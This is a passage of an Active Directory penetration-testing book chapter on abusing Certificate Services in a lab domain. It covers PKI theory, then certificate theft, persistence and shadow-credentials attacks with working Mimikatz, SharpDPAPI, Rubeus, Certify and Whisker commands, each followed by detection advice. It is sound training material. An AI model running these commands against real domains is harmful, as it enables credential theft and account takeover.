<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer255">
<h1 class="chapter-number" id="_idParaDest-148"><a id="_idTextAnchor163"/>8</h1>
<h1 id="_idParaDest-149"><a id="_idTextAnchor164"/>Abusing Active Directory Certificate Services</h1>
<p>In the next two chapters, we will cover services that can be found in almost every environment but are not installed by default during Active Directory deployment. We will start<a id="_idIndexMarker684"/> with <strong class="bold">Active Directory Certificate Service</strong> (<strong class="bold">AD CS</strong>). This service is Microsoft’s implementation of a <strong class="bold">Public Key Infrastructure</strong> (<strong class="bold">PKI</strong>) integrated<a id="_idIndexMarker685"/> with Active Directory. It allows us to utilize public key cryptography throughout the Active Directory forest, providing certificates, digital signatures, code signing, and other capabilities. As usual, with great power comes great responsibility. AD CS has been often overlooked in terms of hardening and monitoring due to its complex nature. In June 2021, <em class="italic">SpecterOps</em> released a comprehensive research paper where they described known and new ways to attack <span class="No-Break">AD CS[1].</span></p>
<p>We will start our learning journey by explaining the necessary PKI theory. We will then cover possible ways to steal certificates and achieve persistence on user and computer domain accounts. Finally, we will explore domain privilege escalation and persistence techniques that allow an adversary to compromise the domain environment. As usual, all attacks will be followed by detailed detection and <span class="No-Break">prevention recommendations.</span></p>
<p>In this chapter, we will explore the <span class="No-Break">following topics:</span></p>
<ul>
<li><span class="No-Break">PKI theory</span></li>
<li><span class="No-Break">Certificate theft</span></li>
<li><span class="No-Break">Account persistence</span></li>
<li>Domain <span class="No-Break">privilege escalation</span></li>
<li><span class="No-Break">Domain persistence</span></li>
</ul>
<h1 id="_idParaDest-150"><a id="_idTextAnchor165"/>Technical requirements</h1>
<p>In this chapter, you will need to have access to <span class="No-Break">the following:</span></p>
<ul>
<li>VMware Workstation or Oracle VirtualBox with at least 16 GB of RAM, 8 CPU cores, and at least 55 GB of total space (more if you <span class="No-Break">take snapshots)</span></li>
<li>A Linux-based operating system is <span class="No-Break">strongly recommended</span></li>
<li>From the GOADv2 project, we will use DC03 <span class="No-Break">and SRV03</span></li>
</ul>
<h1 id="_idParaDest-151"><a id="_idTextAnchor166"/>PKI theory</h1>
<p>In this section, we will cover the necessary theory and terminology that will be used later on in the chapter. First of all, what<a id="_idIndexMarker686"/> is <strong class="bold">public key cryptography</strong>? It is an asymmetric cryptographic system that uses a pair of related keys. Secondly, how does it work? In plain words, the user generates two keys (private and public) and uses the private key for decryption/signing the message. The second key is available for everyone (which is why it is called public) to encrypt/check the signature of the message. These two keys are mathematically tied, but it is not possible to recover the private key from the <a id="_idIndexMarker687"/>public key. Keeping in mind the concept that has just been described, we can now discuss PKI in <span class="No-Break">more detail.</span></p>
<p>The most important components of PKI <a id="_idIndexMarker688"/>are the <strong class="bold">Certification Authority</strong> (<strong class="bold">CA</strong>), <strong class="bold">Registration Authority</strong> (<strong class="bold">RA</strong>), central directory, certificate management system, and certificate<a id="_idIndexMarker689"/> policy. The CA is the heart of PKI. Using its own private key, it signs the public key bound to a given user. The CA can be root and intermediate. The RA is in charge of the identity verification of the entities. The central directory stores keys and the certificate management system controls access to certificates and their delivery. The certificate policy defines entities of PKI, roles, <span class="No-Break">and duties.</span></p>
<p>Let us now discuss available AD CS roles in Active Directory[2]. Microsoft creates <span class="No-Break">six roles:</span></p>
<ul>
<li><strong class="bold">CA</strong> – issues <a id="_idIndexMarker690"/>certificates and <a id="_idIndexMarker691"/>manages <span class="No-Break">their validity</span></li>
<li><strong class="bold">CA Web Enrollment</strong> – allows<a id="_idIndexMarker692"/> users to connect to the CA via the browser and <a id="_idIndexMarker693"/>request certificates <a id="_idIndexMarker694"/>and <strong class="bold">certificate revocation </strong><span class="No-Break"><strong class="bold">lists</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="bold">CRLs</strong></span><span class="No-Break">)</span></li>
<li><strong class="bold">Online Responder</strong> – evaluates<a id="_idIndexMarker695"/> the status information of the <a id="_idIndexMarker696"/>certificate and sends it back to <span class="No-Break">the requestor</span></li>
<li><strong class="bold">Network Device Enrollment Service</strong> (<strong class="bold">NDES</strong>) – allows<a id="_idIndexMarker697"/> obtaining certificates for <span class="No-Break">network </span><span class="No-Break"><a id="_idIndexMarker698"/></span><span class="No-Break">devices</span></li>
<li><strong class="bold">Certificate Enrollment Web Service</strong> (<strong class="bold">CES</strong>) – allows <a id="_idIndexMarker699"/>enrollment using<a id="_idIndexMarker700"/> the <span class="No-Break">HTTPS protocol</span></li>
<li><strong class="bold">Certificate Enrollment Policy Web Service</strong> (<strong class="bold">CEP</strong>) – allows users and computers to obtain certificate enrollment<a id="_idIndexMarker701"/> <span class="No-Break">policy </span><span class="No-Break"><a id="_idIndexMarker702"/></span><span class="No-Break">information</span></li>
</ul>
<p>Next, we will cover certificates, templates, and processes associated with them in more detail. A certificate<a id="_idIndexMarker703"/> is a digitally signed CA document, formatted in X.509. Each certificate has its own purpose, such as client<a id="_idIndexMarker704"/> authentication, code signing, smart card logon, and so on. These purposes are described as <strong class="bold">object identifiers</strong> (<strong class="bold">OIDs</strong>) and are called extended key usages. The certificate template<a id="_idIndexMarker705"/> defines its purpose, what information will be required from the user to obtain the certificate, and applicable access controls. Treat the certificate template as a prototype that will be filled with the user’s information during the <span class="No-Break">issuance process.</span></p>
<p>Now, let us discuss how users can request certificates. This<a id="_idIndexMarker706"/> process is called <strong class="bold">enrollment</strong>. First, clients find an Enterprise CA, then generate a private and public key pair, put the public key and other relevant information in a <strong class="bold">certificate signing request</strong> (<strong class="bold">CSR</strong>), sign the <a id="_idIndexMarker707"/>CSR with its own private key, and send it to the Enterprise CA. Second, the CA performs checks such as user permissions to request a particular certificate template and whether the user is allowed to enroll at all. If all checks have passed successfully, the CA will fill the template with the supplied user information, sign the certificate with its own private key, and send <span class="No-Break">it back.</span></p>
<p>Two protocols <a id="_idIndexMarker708"/>that support certificate authentication in Active Directory are Kerberos and <strong class="bold">Secure Channel</strong> (<strong class="bold">Schannel</strong>). Kerberos <a id="_idIndexMarker709"/>utilizes <strong class="bold">Public Key Cryptography for Initial Authentication</strong> (<strong class="bold">PKINIT</strong>). Users will sign the authentication challenge using the private key of their certificate and send it to the domain controller. If the verification process is successful, a TGT will be issued. Another protocol is Schannel. The domain controller requests a certificate from the client during authentication and maps the credentials to a user account by using the Kerberos S4U2self extension. If it fails, the next attempt is to<a id="_idIndexMarker710"/> map the certificate to the user’s account based on the <strong class="bold">Subject Alternative Name</strong> (<strong class="bold">SAN</strong>) extension, subject, and issuer fields. Schannel works well <span class="No-Break">with LDAPS.</span></p>
<p>Pass-the-certificate<a id="_idIndexMarker711"/> is a pre-authentication stage in the authentication process where the certificate is used to obtain a TGT. In the case of PKINIT, we can request a TGT with an authentication certificate. If PKINIT is not supported, we can authenticate via LDAP/S with a tool<a id="_idIndexMarker712"/> called PassTheCert[3]. Great research from the tool’s author can be found at the link <span class="No-Break">given later[4].</span></p>
<p>Before we begin, we need to <a id="_idIndexMarker713"/>enable auditing for AD CS so we can detect our own malicious activity. One of the best detection guides was presented at the PHDays conference[5]. In this presentation, you will also find ready-to-use searches. To enable logging through the Group Policy, we need to tick both <strong class="bold">Success</strong> and <strong class="bold">Failure</strong> under the following path in <strong class="bold">Default Domain Policy</strong>: <strong class="bold">Computer Configuration</strong> | <strong class="bold">Policies</strong> | <strong class="bold">Windows Settings</strong> | <strong class="bold">Security Settings</strong> | <strong class="bold">Advanced Audit Policy Configuration</strong> | <strong class="bold">Audit Policy</strong> | <strong class="bold">Object Access</strong> | <strong class="bold">Audit </strong><span class="No-Break"><strong class="bold">Certification Services</strong></span><span class="No-Break">.</span></p>
<p>Next, in the CA properties, we will enable <strong class="bold">Auditing</strong> for all events, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer211">
<img alt="Figure 8.1 – Enabling auditing for AD CS events" height="305" src="image/B18964_08_01.jpg" width="389"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.1 – Enabling auditing for AD CS events</p>
<p>Now that we understand the key concepts of PKI, let us delve into the practical part. Of course, there is more theory to cover, but we will gradually introduce it when it is necessary for attack understanding. If you would like to have a deep dive first, feel free to go through the SpecterOps paper mentioned in the introduction. We will start our learning journey with certificate <span class="No-Break">theft techniques.</span></p>
<h1 id="_idParaDest-152"><a id="_idTextAnchor167"/>Certificate theft</h1>
<p>This section will focus on certificate theft at the endpoint. If <a id="_idIndexMarker714"/>AD CS is deployed in the environment, chances are high that certificates are being used for domain authentication. Windows uses a certificate in <strong class="source-inline">.pfx</strong> format, which contains the certificate itself and the corresponding private key. However, private keys can be stored separately – for<a id="_idIndexMarker715"/> example, on specialized hardware such as <strong class="bold">Trusted Platform Modules</strong> (<strong class="bold">TPMs</strong>), <strong class="bold">Hardware Security Modules</strong> (<strong class="bold">HSMs</strong>), or smart<a id="_idIndexMarker716"/> cards. Most companies do not introduce hardware elements, and keys are stored in the operating system. Windows protects keys with the help of<a id="_idIndexMarker717"/> the <strong class="bold">Data Protection Application Programming Interface</strong> (<strong class="bold">DPAPI</strong>). For the demonstration, let us issue the <strong class="source-inline">khal.drogo</strong> user certificate with a non-exportable private key. We <a id="_idIndexMarker718"/>can do it via the Certificates snap-in in <strong class="bold">Microsoft Management Console</strong> (<strong class="bold">MMC</strong>). Now, we are ready to start with <span class="No-Break">the practice.</span></p>
<h2 id="_idParaDest-153"><a id="_idTextAnchor168"/>THEFT1 – Exporting certificates using the CryptoAPI</h2>
<p>There are <a id="_idIndexMarker719"/>two ways to export certificates. The first one is via the GUI in <strong class="source-inline">certmgr.msc</strong> or with the help of a PowerShell cmdlet or with<a id="_idIndexMarker720"/> the CertStealer tool[6]. These<a id="_idIndexMarker721"/> tools use the Windows CryptoAPI and allow export only if the private key is exportable. If this is not the case, we can use Mimikatz. The idea is to patch either <strong class="bold">CryptoAPI</strong> (<strong class="bold">CAPI</strong>) or <strong class="bold">Cryptography API: Next Generation</strong> (<strong class="bold">CNG</strong>), depending on the <a id="_idIndexMarker722"/>key provider, to allow the private key export. It is important to mention that the CAPI patch is happening in the current process. The CNG patch is required when Microsoft Software Key Storage Provider is being used and will patch the <strong class="bold">Key isolation</strong> (<strong class="bold">KeyIso</strong>) service<a id="_idIndexMarker723"/> in the <strong class="source-inline">lsass.exe</strong> process, meaning you need “debug” privileges on the machine. The following command will show that <strong class="source-inline">khal.drogo</strong> has a certificate with a non-exportable <span class="No-Break">private key:</span></p>
<pre class="console">
mimikatz.exe "crypto::certificates /export" "crypto::capi" "crypto::certificates /export"  "exit"</pre> <p>The first export attempt failed with an error in the <strong class="source-inline">Private export</strong> field, but after that, the patch export was successful. The result of the command execution is <span class="No-Break">shown here:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer212">
<img alt="Figure 8.2 – Successful certificate export for khal.drogo" height="1625" src="image/B18964_08_02.jpg" width="1420"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.2 – Successful certificate export for khal.drogo</p>
<p>The only <a id="_idIndexMarker724"/>way to detect this attack is when a <a id="_idIndexMarker725"/>CNG patch is required and access to <strong class="source-inline">lsass.exe</strong> is <span class="No-Break">being monitored.</span></p>
<h2 id="_idParaDest-154"><a id="_idTextAnchor169"/>THEFT2 – User certificate theft via DPAPI</h2>
<p>DPAPI is a<a id="_idIndexMarker726"/> Windows component that allows applications to store <a id="_idIndexMarker727"/>sensitive data. This data is protected by a master key that is derived from the user’s password hash, SID, and Salt by applying the PBKDF2 function. Certificates are stored in the <strong class="source-inline">HKEY_CURRENT_USER\SOFTWARE\Microsoft\SystemCertificates</strong> registry key or the <strong class="source-inline">%APPDATA%\Microsoft\systemcertificates\my\certificates</strong> folder. Associated private keys are stored in <strong class="source-inline">%APPDATA%\Microsoft\Crypto\RSA\User SID</strong> for CAPI keys and <strong class="source-inline">%APPDATA%\Microsoft\Crypto\keys</strong> for CNG keys. Just a small remark: you will not be able to see keys in the folders, even when hidden files are enabled. To check the content of these folders, use the <strong class="source-inline">dir</strong> /<strong class="source-inline">a:s</strong> command line. To decrypt the certificate’s private key, we need the corresponding master key. There are certain ways to obtain the master key, but three of them require <span class="No-Break">elevated privileges:</span></p>
<ul>
<li>Backup keys from the domain <span class="No-Break">controller (</span><span class="No-Break"><strong class="source-inline">lsadump::backupkeys</strong></span><span class="No-Break">)</span></li>
<li>DPAPI cached master <span class="No-Break">keys (</span><span class="No-Break"><strong class="source-inline">sekurlsa::dpapi</strong></span><span class="No-Break">)</span></li>
<li>The <strong class="source-inline">DPAPI_SYSTEM</strong> <span class="No-Break">key (</span><span class="No-Break"><strong class="source-inline">lsadump::secrets</strong></span><span class="No-Break">)</span></li>
<li>By supplying the user’s hash <span class="No-Break">or password</span></li>
</ul>
<p>The following Mimikatz commands will allow you to dump the certificate in the <strong class="source-inline">.der</strong> format, find out what the master key is via the <strong class="source-inline">guidMasterKey</strong> value, decrypt the master key, and finally, decrypt the certificate’s <span class="No-Break">private key:</span></p>
<pre class="console">
crypto::system /file:C:\users\khal.drogo\appdata\roaming\microsoft\systemcertificates\my\certificates\C7889A4CBF0B4F10CA29347D81327DC6CED9ED95 /export
dpapi::capi /in:C:\Users\khal.drogo\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2801885930-3847104905-347266793-1112\d2d039eb9fe8cf2dd19f701b6f890220_9d1ba1ca-81ea-41ad-bc71-414af8de5013
dpapi::masterkey /in:C:\Users\khal.drogo\AppData\Roaming\Microsoft\Protect\S-1-5-21-2801885930-3847104905-347266793-1112\6e1524df-7d72-4b90-a95f-72341d79449f /rpc
dpapi::capi /in:C:\Users\khal.drogo\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2801885930-3847104905-347266793-1112\d2d039eb9fe8cf2dd19f701b6f890220_9d1ba1ca-81ea-41ad-bc71-414af8de5013 /masterkey:5401985c1aa5a8ae1f25a9f08beaa53f4b6ad98e</pre> <p>With the<a id="_idIndexMarker728"/> help of <strong class="source-inline">openssl</strong> on a Linux machine, we can build a valid <strong class="source-inline">.</strong><span class="No-Break"><strong class="source-inline">pfx</strong></span><span class="No-Break"> file:</span></p>
<pre class="console">
openssl x509 -inform DER -outform PEM -in C7889A4CBF0B4F10CA29347D81327DC6CED9ED95.der -out public.pem
openssl rsa -inform PVK -outform PEM -in dpapi_exchange_capi_0_te-User-d700e753-1b10-45c7-aa92-b8a8ffe7493d.keyx.rsa.pvk -out private.pem
openssl pkcs12 -in public.pem -inkey private.pem -password pass:12345 -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out drogo_cert.pfx</pre> <p>The result of the preceding commands is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer213">
<img alt="Figure 8.3 – Successfully building a .pfx certificate for khal.drogo" height="180" src="image/B18964_08_03.jpg" width="1310"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.3 – Successfully building a .pfx certificate for khal.drogo</p>
<p>One important caveat is that the<strong class="source-inline">/rpc</strong> key in the <strong class="source-inline">dpapi::masterkey</strong> command will initiate the connection to the domain controller’s <strong class="source-inline">IPC</strong>$ and create a <strong class="source-inline">protected_storage</strong> named <strong class="source-inline">pipe</strong>. We can see the traffic sample in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer214">
<img alt="Figure 8.4 – Traffic between machine and domain controller" height="377" src="image/B18964_08_04.jpg" width="1360"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.4 – Traffic between machine and domain controller</p>
<p>Another<a id="_idIndexMarker729"/> way to detect certificate theft is via auditing the SACLs. By using Object Read SACLs, defenders can detect access to the DPAPI master keys and private keys. Windows event ID 4663 will be logged on to the server event log, including the <span class="No-Break">process name.</span></p>
<h2 id="_idParaDest-155"><a id="_idTextAnchor170"/>THEFT3 – Machine certificate theft via DPAPI</h2>
<p>In order to <a id="_idIndexMarker730"/>steal machine certificates, an<a id="_idIndexMarker731"/> attacker requires elevated privileges. Machine master keys are located in the <strong class="source-inline">C:\Windows\System32\Microsoft\Protect\S-1-5-18\User</strong> and <strong class="source-inline">C:\Windows\System32\Microsoft\Protect\S-1-5-18</strong> folders. The machine certificates’ private keys are located in <strong class="source-inline">C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys</strong> for CAPI and <strong class="source-inline">C:\ProgramData\Microsoft\Crypto\Keys</strong> for CNG. To decrypt these private keys, the <strong class="source-inline">DPAPI_SYSTEM</strong> secret is required. To perform this attack, we will use <strong class="bold">SharpDPAPI</strong>[<em class="italic">7</em>]. We will run this tool with elevated privileges; it will automatically elevate to <strong class="source-inline">SYSTEM</strong>, dump the <strong class="source-inline">DPAPI_SYSTEM</strong> secret, and use it to find and decrypt master keys. As a last step, it will decrypt all the machine certificates’ <span class="No-Break">private keys:</span></p>
<pre class="console">
SharpDPAPI.exe certificates /machine</pre> <p>The elevation of privileges and obtaining of <strong class="source-inline">DPAPI_SYSTEM</strong> can be <span class="No-Break">observed here:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer215">
<img alt="Figure 8.5 – SharpDPAPI obtained DPAPI_SYSTEM" height="754" src="image/B18964_08_05.jpg" width="1251"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.5 – SharpDPAPI obtained DPAPI_SYSTEM</p>
<p>The<a id="_idIndexMarker732"/> result of the<a id="_idIndexMarker733"/> SharpDPAPI execution can be <span class="No-Break">seen here:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer216">
<img alt="Figure 8.6 – One of the machine certificates with decrypted private key" height="701" src="image/B18964_08_06.jpg" width="1440"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.6 – One of the machine certificates with decrypted private key</p>
<p>This<a id="_idIndexMarker734"/> attack uses the <strong class="source-inline">DPAPI_SYSTEM</strong> secret, so <a id="_idIndexMarker735"/>no traffic will be sent from the machine. The only possible detection is to audit via SACL reading of <span class="No-Break">DPAPI-encrypted keys.</span></p>
<h2 id="_idParaDest-156"><a id="_idTextAnchor171"/>THEFT4 – Harvest for certificate files</h2>
<p>Another effective attack is a <a id="_idIndexMarker736"/>simple search for certificates (<strong class="source-inline">.crt</strong>/<strong class="source-inline">.cer</strong>/<strong class="source-inline">.pfx</strong>), keys (<strong class="source-inline">.key</strong>), CSR (<strong class="source-inline">.csr</strong>), and Java KeyStores (<strong class="source-inline">.jks</strong>/<strong class="source-inline">.keystore</strong>/<strong class="source-inline">.keys</strong>). For password-protected certificates, a hash can be extracted with the help of the <strong class="source-inline">pfx2john</strong> tool<a id="_idIndexMarker737"/> and then cracked. To understand what the certificate’s purpose is, we can run the <span class="No-Break">following command:</span></p>
<pre class="console">
certutil -dump -v drogo_cert.pfx</pre> <p>The result of the preceding command running against the extracted user’s certificate from the <em class="italic">THEFT2</em> attack is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer217">
<img alt="Figure 8.7 – Harvested khal.drogo certificate’s EKU" height="408" src="image/B18964_08_07.jpg" width="722"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.7 – Harvested khal.drogo certificate’s EKU</p>
<p>One important note: if you have an <strong class="source-inline">invalid password</strong> error during dumping, you need to add the <strong class="source-inline">-legacy</strong> option on the last step, when you build the <strong class="source-inline">.pfx</strong> certificate on your <a id="_idIndexMarker738"/>Linux machine <span class="No-Break">with </span><span class="No-Break"><strong class="source-inline">openssl</strong></span><span class="No-Break">.</span></p>
<p>A suggested detection method is to introduce “honey certificates,” so defenders can detect and track <span class="No-Break">malicious activities.</span></p>
<h2 id="_idParaDest-157"><a id="_idTextAnchor172"/>THEFT5 – NTLM credential theft via PKINIT (nPAC-the-hash)</h2>
<p>PKINIT<a id="_idIndexMarker739"/> is a pre-authentication verification mechanism. Briefly, the idea is that we can extract LM and NT hashes from the <strong class="source-inline">PAC_CREDENTIAL_INFO</strong> structure in TGS-REQ when PKINIT is used to <a id="_idIndexMarker740"/>obtain the TGT. This<a id="_idIndexMarker741"/> functionality allows us to switch back to NTLM authentication when the remote server does not support Kerberos but still relies on PKINIT <span class="No-Break">for pre-authentication.</span></p>
<p>The attack steps are <span class="No-Break">the following:</span></p>
<ol>
<li>Perform pre-authentication with PKINIT and obtain the TGT with a session key. PAC in the TGT will contain the <strong class="source-inline">PAC_CREDENTIAL_INFO</strong> structure with NT and LM hashes, but because it is encrypted with the <strong class="source-inline">krbtgt</strong> key, it cannot <span class="No-Break">be decrypted.</span></li>
<li>Next, request a service ticket by combining S4U2self <span class="No-Break">and U2U.</span></li>
<li>The obtained service ticket will contain PAC with the <strong class="source-inline">PAC_CREDENTIAL_INFO</strong> structure, which is encrypted with a session key that can <span class="No-Break">be decrypted.</span></li>
</ol>
<p>The important thing to mention is that we need access to the certificate and its password. This sounds a bit complicated, but all of it can be done with a single command <span class="No-Break">in Rubeus:</span></p>
<pre class="console">
Rubeus.exe asktgt /getcredentials /user:khal.drogo /certificate:drogo_cert.pfx /password:12345 /domain:essos.local /show</pre> <p>The result of the preceding command is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer218">
<img alt="Figure 8.8 – UnPAC-the-hash of the khal.drogo user" height="574" src="image/B18964_08_08.jpg" width="1226"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.8 – UnPAC-the-hash of the khal.drogo user</p>
<p>Detection<a id="_idIndexMarker742"/> of this technique can <a id="_idIndexMarker743"/>be made based on flags set on the ticket during U2U and S4U2self requests. If the <strong class="source-inline">Forwardable</strong>, <strong class="source-inline">Renewable</strong>, <strong class="source-inline">Renewable_ok</strong>, <strong class="source-inline">Enc_tkt_in_skey</strong>, and <strong class="source-inline">Canonicalize</strong> options are set in TGS-REQ, there is a high probability of Certipy, Kekeo, or Rubeus usage[8]. Another way is to track Windows event ID <strong class="source-inline">4768</strong> for certificate <span class="No-Break">information values.</span></p>
<p>In the next section, we will discuss account <span class="No-Break">persistence techniques.</span></p>
<h1 id="_idParaDest-158"><a id="_idTextAnchor173"/>Account persistence</h1>
<p>After an adversary gains an initial foothold, the next step is usually to establish persistence. In this section, we will <a id="_idIndexMarker744"/>only cover persistence techniques that rely on <span class="No-Break">certificate usage.</span></p>
<h2 id="_idParaDest-159"><a id="_idTextAnchor174"/>PERSIST1 – Active user credential theft via certificates</h2>
<p>Users can<a id="_idIndexMarker745"/> request a certificate from the CA in the environment for any available template that they are allowed to enroll in. An attacker will probably focus on templates allowing client authentication. An important caveat is that the template should not require manager approval or “authorized signatures” issuance requirements. This requirement defines how many digital signatures must be applied to the certificate request for approval. There is a default template called <strong class="source-inline">User</strong>, but it may be disabled. To find any other available templates, we can use a tool called <a id="_idIndexMarker746"/><strong class="bold">Certify</strong>[9]. The following command will send LDAP queries and show <span class="No-Break">available templates:</span></p>
<pre class="console">
Certify.exe find /clientauth</pre> <p>The result of the<a id="_idIndexMarker747"/> command execution <span class="No-Break">is here:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer219">
<img alt="Figure 8.9 – Certify found the client authentication certificate template" height="257" src="image/B18964_08_09.jpg" width="1191"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.9 – Certify found the client authentication certificate template</p>
<p>In this example, an authorized signature is not required and domain users can enroll. Then, the attacker can request a certificate in the GUI, with<a id="_idIndexMarker748"/> the <strong class="source-inline">certreq</strong> utility <span class="No-Break">or Certify:</span></p>
<pre class="console">
Certify.exe request /ca:braavos.essos.local\essos-ca /template:User</pre> <p>The certificate was <span class="No-Break">successfully issued:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer220">
<img alt="Figure 8.10 – User certificate was issued" height="719" src="image/B18964_08_10.jpg" width="1156"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.10 – User certificate was issued</p>
<p>The next step is<a id="_idIndexMarker749"/> to copy the private key and certificate from the output in the file and save it with the <strong class="source-inline">.pem</strong> extension. Then, using <strong class="source-inline">openssl</strong>, convert it to <strong class="source-inline">.pfx</strong>, as shown in the <span class="No-Break">following command:</span></p>
<pre class="console">
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -legacy -out viserys_cert.pfx</pre> <p>Now we have a certificate that can be used to request a TGT until the certificate expiration. Also, a change in the user’s password does not influence the certificate. As was shown previously in <em class="italic">THEFT5</em>, an adversary can nPAC-the-hash of the user and obtain the account’s NT hash at any time. This is a stealthy and long-term credential <span class="No-Break">access technique.</span></p>
<p>To detect this type of<a id="_idIndexMarker750"/> persistence, it is <a id="_idIndexMarker751"/>necessary to query the CA database with the help of <strong class="source-inline">certutil.exe</strong>. There is a lot of valuable information that is not shown in the Windows event log – in particular, the used OS version, user/process information, the subject in the certificate, and so on. These parameters can be helpful to detect <span class="No-Break">malicious activity.</span></p>
<h2 id="_idParaDest-160"><a id="_idTextAnchor175"/>PERSIST2 – Machine persistence via certificates</h2>
<p>Issuing a machine <a id="_idIndexMarker752"/>certificate requires elevated privileges. Certify will elevate automatically to <strong class="source-inline">SYSTEM</strong> and obtain the machine certificate with the <span class="No-Break">following command:</span></p>
<pre class="console">
Certify.exe request /ca:braavos.essos.local\essos-ca /template:Machine /machine</pre> <p>The result is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer221">
<img alt="Figure 8.11 – Machine certificate was issued" height="870" src="image/B18964_08_11.jpg" width="1426"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.11 – Machine certificate was issued</p>
<p>Further steps are pretty straightforward. An attacker can obtain a service ticket to any service as any user through S4U2self on the machine. Persistence will work until the certificate expires or the system <a id="_idIndexMarker753"/>name changes. It is very stealthy as no changes on the host <span class="No-Break">have happened.</span></p>
<p>Detection will be the same as it was <span class="No-Break">for </span><span class="No-Break"><em class="italic">PERSIST1</em></span><span class="No-Break">.</span></p>
<h2 id="_idParaDest-161"><a id="_idTextAnchor176"/>PERSIST3 – Account persistence via certificate renewal</h2>
<p>An <a id="_idIndexMarker754"/>adversary can use a certificate during the validity period and renew it during the renewal period or earlier. This approach is difficult to detect as it uses built-in functionality and leaves almost <span class="No-Break">no artifacts.</span></p>
<h2 id="_idParaDest-162"><a id="_idTextAnchor177"/>Shadow credentials</h2>
<p>This technique is an account <a id="_idIndexMarker755"/>takeover; however, it can still be treated as account persistence. The original research was published by <em class="italic">Elad Shamir</em>[10]. If the user is a member of <strong class="source-inline">Key Admins</strong> or <strong class="source-inline">Enterprise Key Admins</strong> or has <strong class="source-inline">GenericWrite</strong> or <strong class="source-inline">GenericAll</strong> rights over other users or computer accounts, it is possible to add <strong class="source-inline">Key Credentials</strong> to the <strong class="source-inline">msDS-KeyCredentialLink</strong> attribute. This attribute stores raw public keys that will then be used to perform Kerberos authentication using PKINIT as that account. An attack can be performed via<a id="_idIndexMarker756"/> <strong class="bold">Whisker</strong>[11] or <strong class="bold">Certify</strong> as well. As a first step, the attacker will identify users to whom we have <span class="No-Break">required rights.</span></p>
<div>
<div class="IMG---Figure" id="_idContainer222">
<img alt="Figure 8.12 – The khal.drogo user has GenericAll over viserys.targaryen" height="223" src="image/B18964_08_12.jpg" width="806"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.12 – The khal.drogo user has GenericAll over viserys.targaryen</p>
<p>Now, the following command will add information to the <span class="No-Break"><strong class="source-inline">msDS-KeyCredentialLink</strong></span><span class="No-Break"> attribute:</span></p>
<pre class="console">
Whisker.exe add /target:viserys.targaryen /domain:essos.local</pre> <p>Under the hood, Whisker will<a id="_idIndexMarker757"/> interact with the domain controller via LDAP and Kerberos. The attack steps are shown in the tool output together with the Rubeus command to execute the <span class="No-Break">nPAC-the-hash attack.</span></p>
<div>
<div class="IMG---Figure" id="_idContainer223">
<img alt="Figure 8.13 – Shadow credentials attack" height="419" src="image/B18964_08_13.jpg" width="1225"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.13 – Shadow credentials attack</p>
<p>To verify that the <a id="_idIndexMarker758"/>attribute has been successfully updated, an attacker can run the <strong class="source-inline">list</strong> command. An attribute contains the user ID, attestation data, public key, last logon time, and device ID, but the output will show only the <span class="No-Break">last two:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer224">
<img alt="Figure 8.14 – Attribute value check" height="145" src="image/B18964_08_14.jpg" width="1200"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.14 – Attribute value check</p>
<p>Detection is possible by monitoring event ID <strong class="source-inline">4768</strong>, where the certificate information is shown. Another detection approach is to configure SACL for the user’s Active Directory object and monitor event ID <strong class="source-inline">5136</strong>. Yet another event ID, <strong class="source-inline">4662</strong>, c<a id="_idTextAnchor178"/>an also be examined. Some important information is the GUID (<strong class="source-inline">5b47d60f-6090-40b2-9f37-2a4de88f3063</strong>) and <strong class="source-inline">Write property</strong> access[8]. A prevention recommendation is typical for ACL abuse scenarios – find misconfigured accounts and fix them. Also, it is recommended to explicitly deny <strong class="source-inline">Everyone</strong> from writing to <span class="No-Break">this attribute.</span></p>
<p>The next section will cover domain privilege <span class="No-Break">escalation attacks.</span></p>
<h1 id="_idParaDest-163"><a id="_idTextAnchor179"/>Domain privilege escalation</h1>
